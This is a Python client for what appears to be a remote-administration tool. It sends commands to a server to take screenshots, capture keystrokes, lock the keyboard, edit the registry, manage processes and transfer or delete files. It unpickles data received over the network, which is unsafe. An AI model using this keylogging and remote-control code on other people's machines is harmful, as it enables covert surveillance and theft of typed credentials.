import os
import socket
from pickle import dumps, loads
from struct import pack, unpack

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def send(header, params=[]):
    req = {'header': header, 'params': params}
    msg = dumps(req)
    length = pack('>Q', len(msg))
    client_socket.sendall(length)
    client_socket.sendall(msg)
    
    
def recv(BUF_SIZE=1024):
    length, = unpack('>Q', client_socket.recv(8))
    data = []
    length_recv = 0
    while length_recv < length:
        part = client_socket.recv(BUF_SIZE)
        length_recv += len(part)
        data.append(part)
    data = b''.join(data)
    return loads(data)


class Client:
    def __init__(self):
        self.host = ''
        self.port = 0

    def connect(self):
        try:
            client_socket.connect((self.host, self.port))
            return True
        except:
            return False
        

    def disconnect(self):
        client_socket.close()

    def req_shutdown(self):
        send('shutdown')

    def req_logout(self):
        send('logout')

    def req_get_screenshot(self):
        send('getscreenshot')
        res = recv()
        return res['data']

    def req_process_start(self, process_name):
        send('process-start', [process_name])
        res = recv()
        return res['ok']

    def req_process_kill(self, pid):
        send('process-kill', [pid])
        res = recv()
        return res['ok']

    def req_process_getall(self):
        send('process-getall')
        res = recv()
        return res['data']

    def req_process_getallapp(self):
        send('process-getallapp')
        res = recv()
        return res['data']

    def req_keystroke_hook(self):
        send('keystroke-hook')
        recv()
    
    def req_keystroke_unhook(self):
        send('keystroke-unhook')
        recv()
    
    def req_keystroke_get(self):
        send('keystroke-get')
        res = recv()
        return res['data']

    def req_lock_keyboard(self):
        send('lock-keyboard')
        recv()

    def req_unlock_keyboard(self):
        send('unlock-keyboard')
        recv()

    def req_reg_getvalue(self, path, value_name):
        send('reg-getvalue', [path, value_name])
        res = recv()
        return res['data']

    def req_reg_setvalue(self, path, value_name, dtype, value):
        send('reg-setvalue', [path, value_name, dtype, value])
        res = recv()
        return res['ok']

    def req_reg_deletevalue(self, path, value_name):
        send('reg-deletevalue', [path, value_name])
        res = recv()
        return res['ok']

    def req_reg_createkey(self, path):
        send('reg-createkey', [path])
        res = recv()
        return res['ok']

    def req_reg_deletekey(self, path):
        send('reg-deletekey', [path])
        res = recv()
        return res['ok']

    def req_reg_import(self, content):
        send('reg-import', [content])
        res = recv()
        return res['ok']

    def req_mac_address(self):  # DONE!!!!!!!!!!!!!!
        send('mac-address')
        res = recv()
        return res['data']
    
    def req_dirtree_getfiles(self, root):
        send('dirtree-getfiles', [root])
        res = recv()
        return res['data']
    
    def req_dirtree_getdrives(self):
        send('dirtree-getdrives')
        res = recv()
        return res['data']
    
    def req_dirtree_client2server(self, src, dst):
        dst = os.path.join(dst, os.path.basename(src))
        send('dirtree-client2server-start', [dst])
        res = recv()
        if not res['ok']:
            return False 
        with open(src, 'rb') as f:
            while True:
                buffer = f.read(1024)
                if not buffer:
                    break
                send('dirtree-client2server-append', [buffer])
                res = recv()
                if not res['ok']:
                    return False
        send('dirtree-client2server-end')

        return True
        
    def req_dirtree_server2client(self, src, dst):
        dst = os.path.join(dst, os.path.basename(src))
        send('dirtree-server2client-start', [src])
        if os.path.isfile(dst):
            os.remove(dst)
        with open(dst, 'ab') as f:
            while True:
                res = recv()
                if not res['ok']:
                    return False
                buffer = res['data']
                if not buffer:
                    break
                f.write(buffer)
                send('dirtree-server2client-ok')

        return True
                
    def req_dirtree_server2server(self, src, dst):
        dst = os.path.join(dst, os.path.basename(src))
        send('dirtree-server2server', [src, dst])
        res = recv()
        return res['ok']
        
    def req_dirtree_deletefile(self, filepath):
        send('dirtree-deletefile', [filepath])
        res = recv()
        return res['ok']